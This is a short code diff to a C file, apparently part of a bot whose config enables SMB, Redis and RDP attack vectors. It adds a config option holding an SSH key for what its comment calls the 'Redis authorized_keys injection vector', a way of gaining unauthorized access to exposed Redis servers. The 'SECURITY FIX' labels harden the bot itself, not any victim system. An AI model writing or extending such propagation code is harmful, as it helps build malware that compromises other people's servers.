@@ -2358,6 +2358,16 @@ int load_config(notnet_bot_t *bot, const char *path) {
             bot->smb_enabled = atoi(value);
         } else if (strcmp(key, "redis_enabled") == 0) {
             bot->redis_enabled = atoi(value);
+        } else if (strcmp(key, "redis_ssh_key") == 0) {
+            /* SECURITY FIX (#72): Provisioned SSH key for the Redis
+             * authorized_keys injection vector. Reject the old literal
+             * placeholder. */
+            if (strstr(value, "notnet-key") || strstr(value, "...")) {
+                log_warn("Config: redis_ssh_key rejected (placeholder value)");
+            } else {
+                strncpy(bot->redis_ssh_key, value, sizeof(bot->redis_ssh_key) - 1);
+                bot->redis_ssh_key[sizeof(bot->redis_ssh_key) - 1] = '\0';
+            }
         } else if (strcmp(key, "rdp_enabled") == 0) {
             bot->rdp_enabled = atoi(value);
         /* SECURITY FIX (#82): Explicit <proto>_enabled keys. These take
